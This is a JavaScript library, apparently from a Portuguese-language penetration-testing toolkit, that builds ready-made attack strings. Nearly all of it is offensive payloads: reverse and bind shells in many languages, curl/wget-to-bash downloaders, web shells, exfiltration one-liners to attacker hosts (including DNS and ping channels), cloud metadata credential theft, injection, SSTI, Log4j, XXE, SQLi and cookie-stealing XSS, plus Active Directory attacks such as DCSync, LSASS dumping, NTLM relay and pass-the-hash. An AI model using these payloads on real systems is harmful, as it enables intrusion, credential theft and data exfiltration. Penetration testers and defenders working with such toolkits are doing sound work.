// Payloads.js - geracao de payloads do canivete (puro JS, sem estado)
.pragma library

function revBash(ip, port) {
  return "bash -c 'exec bash -i &>/dev/tcp/" + ip + "/" + port + " <&1'";
}

function revSh(ip, port) {
  return "sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
}

function revPython(ip, port) {
  return "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'";
}

function revNcMkfifo(ip, port) {
  return "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc " + ip + " " + port + " >/tmp/f";
}

function revNcE(ip, port) {
  return "nc " + ip + " " + port + " -e /bin/bash";
}

function revPhp(ip, port) {
  return "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
}

function revRuby(ip, port) {
  return "ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";
}

function revPowershell(ip, port) {
  return "$c=New-Object Net.Sockets.TCPClient('" + ip + "'," + port + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}";
}

function revPerl(ip, port) {
  return "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
}

function revNode(ip, port) {
  return "node -e '(function(){var s=require(\"net\").Socket();s.connect(" + port + ",\"" + ip + "\",function(){var sh=require(\"child_process\").spawn(\"/bin/sh\",[]);s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);});})()'";
}

function revSocat(ip, port) {
  return "socat TCP:" + ip + ":" + port + " EXEC:/bin/sh,pty,stderr,setsid,sigint,sane";
}

function revSocatSSL(ip, port) {
  return "socat OPENSSL:" + ip + ":" + port + ",verify=0 EXEC:/bin/sh,pty,stderr,setsid,sigint,sane";
}

function revOpenssl(ip, port) {
  return "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect " + ip + ":" + port + " > /tmp/s; rm /tmp/s";
}

function revAwk(ip, port) {
  return "awk 'BEGIN {s = \"/inet/tcp/0/" + ip + "/" + port + "\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while( (c |& getline) > 0 ) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null";
}

function revTelnet(ip, port) {
  return "TF=$(mktemp -u);mkfifo $TF && telnet " + ip + " " + port + " 0<$TF | sh 1>$TF";
}

function revBusybox(ip, port) {
  return "busybox nc " + ip + " " + port + " -e /bin/sh";
}

function revNcatSSL(ip, port) {
  return "ncat --ssl " + ip + " " + port + " -e /bin/sh";
}

function revBashB64(ip, port) {
  var raw = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
  var b64 = "";
  try { b64 = Qt.btoa(raw); } catch (e) { b64 = ""; }
  return "echo " + b64 + " | base64 -d | bash";
}

function revCurlPipe(ip, port) {
  return "curl http://" + ip + ":8000/s.sh | bash";
}

function revWgetPipe(ip, port) {
  return "wget -qO- http://" + ip + ":8000/s.sh | bash";
}

function revPowershellIex(ip, port) {
  return "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://" + ip + ":8000/s.ps1')\"";
}

function revPowershellEncodedHint() {
  return "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <BASE64_UTF16LE>";
}

function revBindNc(port) {
  return "nc -lvnp " + port + " -e /bin/sh";
}

function revBindSocat(port) {
  return "socat TCP-LISTEN:" + port + ",reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane";
}

function revBindPython(port) {
  return "python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\"," + port + "));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'";
}

function listenerNc(port) {
  return "nc -lvnp " + port;
}

function listenerNcat(port) {
  return "ncat -lvnp " + port;
}

function listenerNcatSSL(port) {
  return "ncat --ssl -lvnp " + port;
}

function listenerSocat(port) {
  return "socat TCP-LISTEN:" + port + ",reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane";
}

function listenerSocatTTY(port) {
  return "socat file:`tty`,raw,echo=0 TCP-LISTEN:" + port + ",reuseaddr";
}

function listenerMsf(ip, port) {
  return "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST " + ip + "; set LPORT " + port + "; exploit\"";
}

function msfvenomElf(ip, port) {
  return "msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f elf -o rev.elf";
}

function msfvenomPhp(ip, port) {
  return "msfvenom -p php/meterpreter_reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f raw -o shell.php";
}

function msfvenomAspx(ip, port) {
  return "msfvenom -p windows/meterpreter_reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f aspx -o shell.aspx";
}

function msfvenomPs1(ip, port) {
  return "msfvenom -p windows/x64/shell_reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f powershell -o rev.ps1";
}

function msfvenomWar(ip, port) {
  return "msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f war -o shell.war";
}

function webshellPhpMin() {
  return "<?php system($_GET['cmd']); ?>";
}

function webshellPhpPost() {
  return "<?php if(isset($_POST['c'])){echo '<pre>';system($_POST['c']);echo '</pre>';} ?>";
}

function webshellPhpShort() {
  return "<?=shell_exec($_GET[0])?>";
}

function webshellAspxMin() {
  return "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]); %>";
}

function webshellJspMin() {
  return "<% if(request.getParameter(\"cmd\")!=null){ Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\")); java.io.InputStream i=p.getInputStream(); int a; while((a=i.read())!=-1){out.print((char)a);} } %>";
}

function webshellUpgradeHint(ip, port) {
  return "curl 'http://TARGET/shell.php?cmd='$(python3 -c \"import urllib.parse;print(urllib.parse.quote('bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1'))\")";
}

function ttyPython() {
  return "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'";
}

function ttyScript() {
  return "script -qc /bin/bash /dev/null";
}

function ttyStty() {
  return "stty raw -echo; fg";
}

function ttySocat(ip, port) {
  return "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:" + ip + ":" + port;
}

function ttyExport() {
  return "export TERM=xterm-256color";
}

function linuxSuid() {
  return [
    "find / -user root -perm /4000 2>/dev/null",
    "find / -perm -u=s -type f 2>/dev/null",
    "find / -type f -name '*.txt' 2>/dev/null",
    "getcap -r / 2>/dev/null",
    "uname -a; cat /etc/os-release",
    "id; sudo -l"
  ];
}

function winEnum() {
  return [
    "systeminfo",
    "Get-WmiObject Win32_ComputerSystem",
    "echo \"$env:COMPUTERNAME,$env:USERDNSDOMAIN\"",
    "Get-HotFix -description \"Security update\"",
    "wmic qfe get HotfixID,InstalledOn",
    "whoami /priv"
  ];
}

function transferServer(port) {
  return "python3 -m http.server " + port;
}

function transferWget(ip, port, file) {
  return "wget http://" + ip + ":" + port + "/" + file;
}

function transferCurl(ip, port, file) {
  return "curl http://" + ip + ":" + port + "/" + file + " -o " + file;
}

function transferBashUpload(ip, port, file) {
  return "bash -c 'cat " + file + " > /dev/tcp/" + ip + "/" + port + "'";
}

function transferNcListen(port) {
  return "nc -l -p " + port + " > data";
}

function exfilCurlFile(ip, port, file) {
  return "curl -X POST --data-binary @" + file + " http://" + ip + ":" + port + "/exfil";
}

function exfilWgetPost(ip, port, file) {
  return "wget --post-file=" + file + " http://" + ip + ":" + port + "/exfil -O /dev/null";
}

function exfilNcFile(ip, port, file) {
  return "nc " + ip + " " + port + " < " + file;
}

function exfilTarNc(ip, port) {
  return "tar czf - /var/www/html 2>/dev/null | nc " + ip + " " + port;
}

function exfilB64Chunk(ip, port, file) {
  return "base64 -w0 " + file + " | fold -w 1000 | while read c; do curl -s -X POST -d \"d=$c\" http://" + ip + ":" + port + "/exfil >/dev/null; done";
}

function exfilPythonHttp(ip, port, file) {
  return "python3 -c 'import requests;open(\"/tmp/o\",\"wb\").write(requests.get(\"http://" + ip + ":" + port + "/" + file + "\").content)'  # download | upload: python3 -c 'import requests;requests.post(\"http://" + ip + ":" + port + "/exfil\",data=open(\"" + file + "\",\"rb\").read())'";
}

function exfilDns(file) {
  return "for f in $(base64 -w63 " + file + " | tr -d '='); do dig $f.exfil.attacker.com +short; done";
}

function exfilNslookup(file) {
  return "for /f %i in ('certutil -encode " + file + " tmp.b64 ^&^& type tmp.b64') do nslookup %i.exfil.attacker.com";
}

function exfilPing(file) {
  return "xxd -p " + file + " | while read l; do ping -c1 -p $l " + "ATTACKER_IP" + "; done";
}

function exfilPowershellFile(ip, port, file) {
  return "Invoke-WebRequest -Uri http://" + ip + ":" + port + "/exfil -Method POST -InFile " + file;
}

function exfilPowershellB64(ip, file) {
  return "$d=[Convert]::ToBase64String([IO.File]::ReadAllBytes('" + file + "')); IWR http://" + ip + "/c?d=$d";
}

function exfilCertutilEncode(file) {
  return "certutil -encode " + file + " tmp.b64 & type tmp.b64";
}

function exfilCurlMetadata() {
  return "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/  # cloud SSRF";
}

function rceSemicolon(cmd) {
  return "; " + cmd;
}

function rcePipe(cmd) {
  return "| " + cmd;
}

function rceAnd(cmd) {
  return "&& " + cmd;
}

function rceOr(cmd) {
  return "|| " + cmd;
}

function rceSubshell(cmd) {
  return "$(" + cmd + ")";
}

function rceBacktick(cmd) {
  return "`" + cmd + "`";
}

function rceNewline(cmd) {
  return "%0a" + cmd;
}

function rceSpaceBypass(cmd) {
  return cmd.split(" ").join("${IFS}");
}

function rceB64Wrapper(cmd) {
  var b64 = "";
  try { b64 = Qt.btoa(cmd); } catch (e) { b64 = "<B64>"; }
  return "echo " + b64 + "|base64 -d|bash";
}

function rceHexWrapper(cmd) {
  return "echo '" + cmd + "' | od -A n -t x1 | tr -d ' \\n'  # hex p/ printf: printf '\\x41\\x42'";
}

function rcePhpSystem() {
  return "; system($_GET['cmd']); //";
}

function rcePhpPassthru() {
  return "'; passthru($_GET['cmd']); //";
}

function rcePhpBacktick() {
  return "'; echo `$_GET['cmd']`; //";
}

function rceWinAmp(cmd) {
  return "& " + cmd;
}

function rceWinPowershellEncHint() {
  return "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <BASE64_UTF16LE>";
}

function rceSstiDetect() {
  return "{{7*7}}";
}

function rceSstiJinja() {
  return "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}";
}

function rceSstiJinjaBypass() {
  return "{{ cycler.__init__.__globals__.os.popen('id').read() }}";
}

function rceLog4j(ip, port) {
  return "${jndi:ldap://" + ip + ":" + port + "/a}";
}

function rceLog4jBypass(ip, port) {
  return "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + ip + ":" + port + "/a}";
}

function rceSpringParam() {
  return "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()";
}

function uploadHtaccess() {
  return "AddType application/x-httpd-php .jpg";
}

function uploadUserIni() {
  return "auto_prepend_file=shell.jpg  # +.user.ini -> shell.jpg com <?php system($_GET['cmd']);?>";
}

function uploadDoubleExt() {
  return "shell.phtml | shell.php5 | shell.pht | shell.phar | shell.jpg.php";
}

function lfiProcEnviron() {
  return "foo.php?file=/proc/self/environ&cmd=id";
}

function lfiDataWrapper() {
  return "foo.php?file=data://text/plain,<?php system($_GET['cmd']);?>&cmd=id";
}

function lfiExpectWrapper() {
  return "foo.php?file=expect://id";
}

function lfiInputWrapper() {
  return "curl -s -d '<?php system($_GET[\"cmd\"]);?>' 'http://TARGET/foo.php?file=php://input&cmd=id'";
}

function ssrfCloud() {
  return "url=http://169.254.169.254/latest/meta-data/";
}

function ssrfBypass() {
  return ["url=http://127.0.0.1:80/admin", "url=http://0.0.0.0/admin", "url=http://2130706433/admin", "url=http://0x7f.0x0.0x0.0x1/admin", "url=http://0177.0.0.1/admin"];
}

function xxeFile() {
  return "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>";
}

function xxeOob(ip, port) {
  return "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM \"http://" + ip + ":" + port + "/evil.dtd\"> %xxe;]><r/>";
}

function credCaptureXss(ip, port) {
  return "<script>new Image().src='http://" + ip + ":" + port + "/?c='+encodeURIComponent(document.cookie)</script>";
}

function credLoggerServer(port) {
  return "python3 -c 'from http.server import*;class H(BaseHTTPRequestHandler):\n def do_GET(self):print(self.path);self.send_response(200);self.end_headers();self.wfile.write(b\"ok\")\n def log_message(*a):pass\nHTTPServer((\"0.0.0.0\"," + port + "),H).serve_forever()'";
}

function lfiTraversal() {
  return "foo.php?file=../../../../../../etc/passwd";
}

function lfiWrapper() {
  return "foo.php?file=php://filter/convert.base64-encode/resource=index";
}

function lfiLogs() {
  return "foo.php?file=/var/log/apache2/access.log&cmd=id";
}

function sqliUnion() {
  return [
    "' UNION SELECT NULL,NULL,NULL -- -",
    "' UNION SELECT NULL,NULL,NULL FROM DUAL -- -",
    "' UNION ORDER BY 1 -- -",
    "' OR '1'='1' -- -",
    "admin' --",
    "' OR '1'='1' /*",
    "\" OR \"\"=\"",
    "') OR ('1'='1' -- -",
    "admin' OR '1'='1' -- -",
    "' UNION SELECT 1,2,3 -- -",
    "' UNION SELECT 1,@@version,3 -- -",
    "' UNION SELECT 1,table_name,3 FROM information_schema.tables -- -",
    "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' -- -",
    "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables -- -",
    "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns -- -",
    "' UNION SELECT 1,load_file('/etc/passwd'),3 -- -",
    "' UNION SELECT 1,'pwned',3 INTO OUTFILE '/tmp/pwned.txt' -- -",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- -",
    "' AND UPDATEXML(1,CONCAT(0x3a,(SELECT @@version)),1) -- -",
    "' AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT user()))) -- -",
    "' AND 1=1 -- -",
    "' AND 1=2 -- -",
    "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' -- -",
    "' AND SLEEP(5) -- -",
    "' AND BENCHMARK(10000000,MD5(1)) -- -",
    "'; SELECT pg_sleep(5) -- -",
    "'; WAITFOR DELAY '0:0:5' -- -",
    "' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) -- -",
    "' UNION SELECT NULL,NULL,sqlite_version() -- -",
    "' UNION SELECT 1,2,3 FROM DUAL -- -",
    "1' AND '1'='1",
    "1 OR 1=1 -- -",
    "'; EXEC xp_cmdshell 'whoami' -- -",
    "'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE -- -"
  ];
}


function sqliNoSQL() {
  return [
    "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
    "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
    "username[$ne]=x&password[$ne]=x",
    "' || '1'=='1",
    "{\"$where\": \"sleep(5000)\"}"
  ];
}

function sqlmapHints() {
  return [
    "sqlmap -r req.txt --batch --level 2 --risk 1",
    "sqlmap -u 'http://TARGET/page?id=1' --batch --dbs",
    "sqlmap -u 'http://TARGET/page?id=1' --batch -D db -T users --dump",
    "sqlmap -r req.txt --batch --os-shell",
    "sqlmap -u 'http://TARGET/page?id=1' --batch --time-sec 5 --technique T"
  ];
}

// --- XSS Payloads ---
function xssBasic() {
  return "<script>alert(1)</script>";
}

function xssImg() {
  return "<img src=x onerror=alert(1)>";
}

function xssSvg() {
  return "<svg onload=alert(1)>";
}

function xssEventHandlers() {
  return [
    "<input autofocus onfocus=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(document.domain)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>"
  ];
}

function xssEncoders() {
  return [
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "<iframe src=\"javascript:alert(1)\">"
  ];
}

function xssPolyglots() {
  return [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/<titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "\"--><svg/onload=alert(1)>",
    "'-alert(1)-'",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\'/+alert(1)//'>"
  ];
}

// --- Active Directory ---
function adNslookupSrv(domain) {
  return "nslookup -type=SRV _ldap._tcp.dc._msdcs." + domain;
}

function adEnum4linux(dc) {
  return "enum4linux-ng -A " + dc;
}

function adNxcSmbNull(dc, domain) {
  return "nxc smb " + dc + " -d " + domain + " -u '' -p '' --shares";
}

function adNxcUsers(dc, domain, user, pass) {
  return "nxc smb " + dc + " -d " + domain + " -u '" + user + "' -p '" + pass + "' --users --groups --pass-pol";
}

function adRpcNull(dc) {
  return "rpcclient -U \"\" -N " + dc + " -c enumdomusers";
}

function adLdapBase(dc) {
  return "ldapsearch -x -h " + dc + " -s base namingcontexts";
}

function adLdapUsers(dc, domain) {
  var base = domain.split(".").map(function(p) { return "DC=" + p; }).join(",");
  return "ldapsearch -x -h " + dc + " -b \"" + base + "\" \"(objectClass=user)\" sAMAccountName memberOf | grep -E 'sAMAccountName|memberOf'";
}

function adBloodhoundPy(domain, user, dc) {
  return "bloodhound-python -d " + domain + " -u '" + user + "' -p 'PASS' -dc " + dc + " -ns " + dc + " -c all";
}

function adSharpHound() {
  return "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -Domain LAB.local";
}

function adPowerViewHints() {
  return ["Get-NetDomain", "Get-NetUser | select samaccountname,memberof", "Get-NetGroup -Domain LAB.local", "Find-DomainShare", "Get-NetGPO | select displayName", "Find-InterestingDomainShareFile -Include *pass*,*cred*"];
}

function adKerbruteUsers(domain, dc) {
  return "kerbrute userenum -d " + domain + " --dc " + dc + " users.txt";
}

function adGetNPUsers(domain, dc) {
  return "GetNPUsers.py " + domain + "/ -usersfile users.txt -dc-ip " + dc + " -format hashcat -outputfile asrep.txt";
}

function adSprayKerbrute(domain, dc) {
  return "kerbrute passwordspray -d " + domain + " --dc " + dc + " users.txt 'Pass123!'";
}

function adNxcSpray(dc, domain) {
  return "nxc smb " + dc + " -d " + domain + " -u users.txt -p 'Pass123!' --continue-on-success --no-bruteforce";
}

function adHashcatNtlm() {
  return "hashcat -m 1000 ntlm.txt rockyou.txt --rules-file rules/best64.rule";
}

function adHashcatNetNTLMv2() {
  return "hashcat -m 5600 netntlmv2.txt rockyou.txt";
}

function adHashcatTgs() {
  return "hashcat -m 13100 tgs.txt rockyou.txt";
}

function adHashcatAsrep() {
  return "hashcat -m 18200 asrep.txt rockyou.txt";
}

function adGetUserSPNs(domain, user, dc) {
  return "GetUserSPNs.py " + domain + "/" + user + ":PASS -dc-ip " + dc + " -request -outputfile tgs.txt";
}

function adRubeusKerberoast() {
  return ".\\Rubeus.exe kerberoast /outfile:hashes.txt  # crack: hashcat -m 13100";
}

function adRubeusAsrep() {
  return ".\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt";
}

function adGetTGT(domain, user, dc) {
  return "getTGT.py " + domain + "/" + user + ":PASS -dc-ip " + dc;
}

function adGetTGTpassHash(domain, user, dc) {
  return "getTGT.py " + domain + "/" + user + " -hashes :<NT_HASH> -dc-ip " + dc + "  # overpass-the-hash";
}

function adTicketerGolden(domain) {
  return "ticketer.py -nthash <KRBTGT_NT> -domain-sid <DOMAIN_SID> -domain " + domain + " Administrator  # export KRB5CCNAME";
}

function adNtlmrelayx() {
  return "ntlmrelayx.py -tf targets.txt -smb2support  # + mitm6/responder p/ alimentar";
}

function adPetitPotam(dc, ip) {
  return "PetitPotam.py " + ip + " " + dc + "  # coercao p/ relay no ntlmrelayx";
}

function adCoercer(dc, domain, user) {
  return "coercer scan -t " + dc + " -u '" + user + "' -p 'PASS' -d " + domain + "  # depois: coercer coerce";
}

function adMitm6(domain) {
  return "mitm6 -d " + domain + "  # + ntlmrelayx + ldaps p/ WPAD/DHCPv6 abuse";
}

function adResponder() {
  return "responder -I eth0 -dw  # LLMNR/NBT-NS/MDNS poison p/ NetNTLMv2 -> hashcat -m 5600";
}

function adEvilWinrm(dc, user) {
  return "evil-winrm -i " + dc + " -u '" + user + "' -p 'PASS'";
}

function adEvilWinrmHash(dc, user) {
  return "evil-winrm -i " + dc + " -u '" + user + "' -H <NT_HASH>  # pass-the-hash";
}

function adPsexec(domain, user, dc) {
  return "psexec.py " + domain + "/" + user + ":PASS@" + dc;
}

function adPsexecHash(domain, user, dc) {
  return "psexec.py -hashes :<NT_HASH> " + domain + "/" + user + "@" + dc;
}

function adWmiexec(domain, user, dc) {
  return "wmiexec.py " + domain + "/" + user + ":PASS@" + dc;
}

function adSecretsdump(domain, user, dc) {
  return "secretsdump.py " + domain + "/" + user + ":PASS@" + dc + "  # SAM+LSA+NTDS remoto";
}

function adDcsyncMimi(domain) {
  return "lsadump::dcsync /user:" + domain + "\\krbtgt /domain:" + domain + "  # requer Replicating Directory Changes";
}

function adMimiLsass() {
  return "privilege::debug\nsekurlsa::logonpasswords";
}

function adGPP() {
  return "Get-GPPPassword  # impacket: gpp-decrypt <cpassword>  (SYSVOL Group.xml)";
}

function adCertipyFind(user, dc) {
  return "certipy find -u '" + user + "@LAB.local' -p 'PASS' -dc-ip " + dc + " -stdout  # ESC1-8 ADCS";
}

// --- Pivoting / tuneis ---
function pivSshL(pivot, target) {
  return "ssh -L 8080:" + target + ":80 usuario@" + pivot + "  # acesse 127.0.0.1:8080";
}

function pivSshR(ip) {
  return "ssh -R 8080:127.0.0.1:80 usuario@" + ip + " -N -f  # vitima -> seu listener ssh";
}

function pivSshD(pivot) {
  return "ssh -D 1080 -C -q -N usuario@" + pivot + "  # SOCKS5 127.0.0.1:1080 + proxychains";
}

function pivSshJ(pivot, target) {
  return "ssh -J usuario@" + pivot + " usuario@" + target;
}

function pivSshuttle(pivot, net) {
  return "sshuttle -r usuario@" + pivot + " " + net + "  # VPN over SSH p/ rede interna";
}

function pivChiselServer(port) {
  return "chisel server -p " + port + " --reverse  # no seu VPS/lab";
}

function pivChiselSocks(ip, port) {
  return "chisel client " + ip + ":" + port + " R:socks  # SOCKS 127.0.0.1:1080 na sua maquina";
}

function pivChiselRemote(ip, port, target) {
  return "chisel client " + ip + ":" + port + " R:8080:" + target + ":80";
}

function pivChiselLocal(pivot, port, target) {
  return "chisel client " + pivot + ":" + port + " 8080:" + target + ":80  # forward local via pivot";
}

function pivLigoloProxy() {
  return "./proxy -selfcert  # + ip tuntap add mode tun dev ligolo && ip link set ligolo up";
}

function pivLigoloAgent(ip, port) {
  return "./agent -connect " + ip + ":" + port + " -ignore-cert  # na maquina pivot";
}

function pivLigoloRoute(net) {
  return "ip route add " + net + " dev ligolo  # sessao: session + start";
}

function pivSocatRelay(port, target) {
  return "socat TCP-LISTEN:" + port + ",reuseaddr,fork TCP:" + target + ":80";
}

function pivProxychains() {
  return "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf\nproxychains nxc smb REDE -u user -p 'PASS'";
}

function pivPlinkL(pivot, target) {
  return "plink -ssh -L 8080:" + target + ":80 usuario@" + pivot + "  # pivot Windows";
}

function pivNetshProxy(port, target) {
  return "netsh interface portproxy add v4tov4 listenport=" + port + " listenaddress=0.0.0.0 connectport=80 connectaddress=" + target + "  # + netsh interface portproxy show all";
}

function pivMsfAutoroute(net) {
  return "run autoroute -s " + net + "  # sessao meterpreter -> rota";
}

function pivMsfPortfwd(port, target) {
  return "portfwd add -l " + port + " -p 80 -r " + target + "  # sessao meterpreter";
}

function b64encode(s) {
  try { return Qt.btoa(unescape(encodeURIComponent(s))); }
  catch (e) { return ""; }
}

function b64decode(s) {
  try { return decodeURIComponent(escape(Qt.atob(String(s).replace(/\s+/g, "")))); }
  catch (e) {
    try { return Qt.atob(String(s).replace(/\s+/g, "")); }
    catch (e2) { return ""; }
  }
}

function urlEncode(s) {
  try { return encodeURIComponent(s); }
  catch (e) { return ""; }
}

function urlDecode(s) {
  try { return decodeURIComponent(s); }
  catch (e) { return ""; }
}

function hexEncode(s) {
  var out = ""
  var value = String(s || "")
  for (var i = 0; i < value.length; i++) out += value.charCodeAt(i).toString(16).padStart(2, "0")
  return out
}

function hexDecode(s) {
  try {
    var clean = String(s || "").replace(/\s+/g, "")
    var out = ""
    for (var i = 0; i < clean.length; i += 2) out += String.fromCharCode(parseInt(clean.substr(i, 2), 16))
    return out
  } catch (e) { return "" }
}

function htmlEncode(s) {
  return String(s || "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/\"/g, "&quot;").replace(/'/g, "&#39;")
}

function htmlDecode(s) {
  return String(s || "").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&quot;/g, "\"").replace(/&#39;/g, "'").replace(/&amp;/g, "&")
}

function unicodeEncode(s) {
  var out = ""
  var value = String(s || "")
  for (var i = 0; i < value.length; i++) out += "\\u" + value.charCodeAt(i).toString(16).padStart(4, "0")
  return out
}

function binaryEncode(s) {
  var out = ""
  var value = String(s || "")
  for (var i = 0; i < value.length; i++) out += value.charCodeAt(i).toString(2).padStart(8, "0") + " "
  return out.trim()
}

function binaryDecode(s) {
  try { return String(s || "").trim().split(/\s+/).map(function (x) { return String.fromCharCode(parseInt(x, 2)) }).join("") }
  catch (e) { return "" }
}

function networkCommands() {
  return [
    "ip addr",
    "ip route",
    "cat /etc/resolv.conf",
    "ss -tulpn",
    "ip neigh",
    "curl -I https://example.com",
    "python3 -m http.server 8000",
    "dig example.com",
    "traceroute example.com"
  ]
}

function linuxCheatsheet() {
  return [
    "whoami",
    "id",
    "uname -a",
    "sudo -l",
    "ps aux",
    "find / -perm -4000 -type f 2>/dev/null",
    "getcap -r / 2>/dev/null",
    "crontab -l"
  ]
}

// I18N: dicionario PT->EN (chaves em texto identico ao fonte). Nao traduzir `code` nem `keywords`.
var I18N_EN = {
  "AD - evil-winrm senha": "AD - evil-winrm password",
  "AD - secretsdump remoto": "AD - remote secretsdump",
  "AD - wmiexec.py sem disco": "AD - fileless wmiexec.py",
  "AWS - Listar Buckets S3": "AWS - List S3 Buckets",
  "Abrir porta SOCKS local (1080) atrav\u00e9s de conex\u00e3o SSH": "Open a local SOCKS port (1080) through an SSH connection",
  "Abrir túnel SOCKS5 local na porta 1080 via SSH": "Open a local SOCKS5 tunnel on port 1080 via SSH",
  "Acessar servi\u00e7o interno (ex: 8080 ou 3306) na porta local": "Access an internal service (e.g. 8080 or 3306) on the local port",
  "Acesso interativo remoto para testes autorizados": "Remote interactive access for authorized testing",
  "Active Directory - Coleta Rápida BloodHound": "Active Directory - Quick BloodHound Collection",
  "Active Directory - Dump de NTLM Hashes (DCSync)": "Active Directory - NTLM Hash Dump (DCSync)",
  "Active Directory - Listar Membros de Domain Admins": "Active Directory - List Domain Admins Members",
  "Ajusta as permissões da chave privada para 600 e conecta ignorando validação estrita de host.": "Sets private key permissions to 600 and connects ignoring strict host validation.",
  "Ativar e executar comandos do sistema operacional via SQL Server": "Enable and run operating system commands via SQL Server",
  "Audita configura\u00e7\u00f5es, privil\u00e9gios de usu\u00e1rio e atualiza\u00e7\u00f5es instaladas no Windows.": "Audits settings, user privileges and installed updates on Windows.",
  "Autenticar diretamente como administrador comentando a valida\u00e7\u00e3o de senha": "Authenticate directly as administrator by commenting out password validation",
  "Avalia expressões SpEL invocando Runtime.getRuntime().exec() para RCE.": "Evaluates SpEL expressions by invoking Runtime.getRuntime().exec() for RCE.",
  "Azure - Listar Resource Groups": "Azure - List Resource Groups",
  "Baixa ou envia arquivos entre a m\u00e1quina do operador e o host alvo.": "Downloads or uploads files between the operator machine and the target host.",
  "Baixar arquivo sensível do host remoto via SSH": "Download a sensitive file from the remote host via SSH",
  "Baixar ou enviar arquivo de forma criptografada via SSH": "Download or upload a file encrypted via SSH",
